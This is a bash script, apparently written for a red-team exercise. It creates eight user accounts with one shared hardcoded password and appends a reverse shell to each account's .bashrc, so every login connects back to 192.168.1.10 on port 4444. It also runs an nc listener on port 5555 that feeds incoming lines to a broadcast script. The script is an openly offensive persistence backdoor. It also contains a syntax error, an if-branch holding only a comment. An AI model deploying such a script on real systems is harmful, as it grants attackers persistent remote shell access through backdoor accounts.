#!/bin/bash

usernames=("caroline" "denna" "kvothe" "bast" "auri" "ambrose" "elodin" "fela")

for username in "${usernames[@]}"; do
    # Create red team users
    if id "$username" &>/dev/null; then
        # do nothing
    else
        useradd -m -s /bin/bash "$username"
    fi
    # Set passwords for red team users
    echo "$username:aTerg0Lupi!" | chpasswd
    # Spawn reverse shell in each user's bash profile
    touch "/home/$username/.bashrc"
    echo "bash -i >& /dev/tcp/192.168.1.10/4444 0>&1 &" >> "/home/$username/.bashrc"
    chown "$username:$username" "/home/$username/.bashrc"
done

# Listen for messages and display them in terminals
nc -lvnp 5555 | while read line; do
        /etc/System-Clock/chronos-broadcast.sh "$line"
done